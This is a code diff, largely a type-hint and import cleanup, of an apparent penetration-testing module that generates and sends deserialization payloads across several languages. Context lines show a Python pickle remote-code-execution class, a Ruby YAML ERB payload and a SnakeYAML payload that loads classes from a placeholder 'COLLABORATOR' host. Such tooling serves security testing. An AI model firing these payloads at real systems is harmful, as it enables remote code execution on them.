@@ -4,7 +4,7 @@ Provides payload generation and testing for insecure deserialization vulnerabili
 
 Features:
 - PHP deserialization payloads
-- Java deserialization (ysoserial-style) payloads  
+- Java deserialization (ysoserial-style) payloads
 - Python pickle deserialization payloads
 - Ruby deserialization payloads
 - .NET deserialization payloads (ViewState, BinaryFormatter)
@@ -13,15 +13,11 @@ Features:
 - Payload encoding (Base64, gzip, hex)
 """
 
-import asyncio
 import base64
 import zlib
-import json
-import re
-import os
-from typing import Dict, List, Any, Optional
+from dataclasses import asdict, dataclass
 from datetime import datetime
-from dataclasses import dataclass, asdict
+from typing import Any
 from urllib.parse import quote
 
 
@@ -31,15 +27,15 @@ class DeserializationResult:
     target: str
     language: str
     vulnerability_detected: bool
-    findings: List[Dict[str, Any]]
+    findings: list[dict[str, Any]]
     payloads_generated: int
-    payloads_tested: Dict[str, Any]
+    payloads_tested: dict[str, Any]
     execution_time_seconds: float
     tool_version: str
-    raw_responses: List[Dict[str, Any]]
-    errors: List[str]
+    raw_responses: list[dict[str, Any]]
+    errors: list[str]
 
-    def to_dict(self) -> Dict[str, Any]:
+    def to_dict(self) -> dict[str, Any]:
         return asdict(self)
 
 
@@ -47,7 +43,7 @@ class DeserializationResult:
 # PAYLOAD GENERATORS
 # ============================================================================
 
-def _php_payloads(command: str = "id") -> List[Dict[str, Any]]:
+def _php_payloads(command: str = "id") -> list[dict[str, Any]]:
     """Generate PHP deserialization payloads"""
     payloads = []
 
@@ -87,7 +83,7 @@ def _php_payloads(command: str = "id") -> List[Dict[str, Any]]:
     return payloads
 
 
-def _java_payloads(command: str = "id") -> List[Dict[str, Any]]:
+def _java_payloads(command: str = "id") -> list[dict[str, Any]]:
     """Generate Java deserialization payloads (ysoserial-style)"""
     payloads = []
 
@@ -105,7 +101,7 @@ def _java_payloads(command: str = "id") -> List[Dict[str, Any]]:
     for chain in gadget_chains:
         payloads.append({
             "name": f"java_ysoserial_{chain}",
-            "payload": f"rO0ABXQAKXt5c29zZXJpYWwve2NoYWlufS9jb21tYW5kOntjb21tYW5kfQ==",
+            "payload": "rO0ABXQAKXt5c29zZXJpYWwve2NoYWlufS9jb21tYW5kOntjb21tYW5kfQ==",
             "encoding": "base64_java",
             "gadget_chain": chain,
             "description": f"Java ysoserial {chain} gadget chain (simulated - install ysoserial for real payloads)",
@@ -122,13 +118,13 @@ def _java_payloads(command: str = "id") -> List[Dict[str, Any]]:
     return payloads
 
 
-def _python_payloads(command: str = "id") -> List[Dict[str, Any]]:
+def _python_payloads(command: str = "id") -> list[dict[str, Any]]:
     """Generate Python pickle deserialization payloads"""
     payloads = []
 
     # Pickle RCE payload
-    import pickle as _pickle
     import os as _os
+    import pickle as _pickle
 
     class _RCE:
         def __reduce__(self):
@@ -162,7 +158,7 @@ def _python_payloads(command: str = "id") -> List[Dict[str, Any]]:
     return payloads
 
 
-def _dotnet_payloads(command: str = "id") -> List[Dict[str, Any]]:
+def _dotnet_payloads(command: str = "id") -> list[dict[str, Any]]:
     """Generate .NET deserialization payloads"""
     payloads = []
 
@@ -199,7 +195,7 @@ def _dotnet_payloads(command: str = "id") -> List[Dict[str, Any]]:
     return payloads
 
 
-def _ruby_payloads(command: str = "id") -> List[Dict[str, Any]]:
+def _ruby_payloads(command: str = "id") -> list[dict[str, Any]]:
     """Generate Ruby deserialization payloads"""
     payloads = []
 
@@ -215,7 +211,7 @@ def _ruby_payloads(command: str = "id") -> List[Dict[str, Any]]:
 
     payloads.append({
         "name": "ruby_yaml_rce",
-        "payload": f"--- !ruby/object:ERB\ntemplate: id\n",
+        "payload": "--- !ruby/object:ERB\ntemplate: id\n",
         "encoding": "plain",
         "description": "Ruby YAML deserialization RCE via ERB template",
     })
@@ -223,7 +219,7 @@ def _ruby_payloads(command: str = "id") -> List[Dict[str, Any]]:
     return payloads
 
 
-def _nodejs_payloads(command: str = "id") -> List[Dict[str, Any]]:
+def _nodejs_payloads(command: str = "id") -> list[dict[str, Any]]:
     """Generate Node.js deserialization payloads"""
     payloads = []
 
@@ -251,13 +247,13 @@ def _nodejs_payloads(command: str = "id") -> List[Dict[str, Any]]:
     return payloads
 
 
-def _yaml_payloads(command: str = "id") -> List[Dict[str, Any]]:
+def _yaml_payloads(command: str = "id") -> list[dict[str, Any]]:
     """Generate YAML deserialization payloads"""
     payloads = []
 
     payloads.append({
         "name": "snakeyaml_rce",
-        "payload": f"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://COLLABORATOR/?\"]]]]",
+        "payload": "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://COLLABORATOR/?\"]]]]",
         "encoding": "plain",
         "description": "SnakeYAML deserialization RCE via ScriptEngineManager",
     })
@@ -288,7 +284,7 @@ class DeserializationTool:
     def __init__(self):
         self.name = "deserialization_tool"
         self.supported_languages = LANGUAGES
-        self.version_cache: Optional[str] = "1.0.0"
+        self.version_cache: str | None = "1.0.0"
 
     def is_available(self) -> bool:
         """Deserialization tool is always available (payload-based generators)"""
@@ -301,7 +297,7 @@ class DeserializationTool:
         self,
         language: str = "all",
         command: str = "id",
-    ) -> Dict[str, List[Dict[str, Any]]]:
+    ) -> dict[str, list[dict[str, Any]]]:
         """
         Generate deserialization payloads for testing.
 
@@ -339,8 +335,8 @@ class DeserializationTool:
         language: str = "all",
         command: str = "id",
         method: str = "POST",
-        headers: Optional[Dict[str, str]] = None,
-        cookie: Optional[str] = None,
+        headers: dict[str, str] | None = None,
+        cookie: str | None = None,
         timeout_sec: int = 30,
     ) -> DeserializationResult:
         """
@@ -362,7 +358,7 @@ class DeserializationTool:
         raw_responses = []
         start_time = datetime.now()
         vuln_detected = False
-        payloads_tested: Dict[str, Any] = {}
+        payloads_tested: dict[str, Any] = {}
 
         if not headers:
             headers = {}
@@ -464,7 +460,7 @@ class DeserializationTool:
             errors=errors
         )
 
-    def get_capabilities(self) -> Dict[str, Any]:
+    def get_capabilities(self) -> dict[str, Any]:
         """Return tool capabilities for tool discovery"""
         return {
             'name': self.name,
@@ -496,7 +492,7 @@ class DeserializationTool:
 
 
 # Global instance for tool registry
-_deserialization_tool: Optional[DeserializationTool] = None
+_deserialization_tool: DeserializationTool | None = None
 
 
 def get_deserialization_tool() -> DeserializationTool:
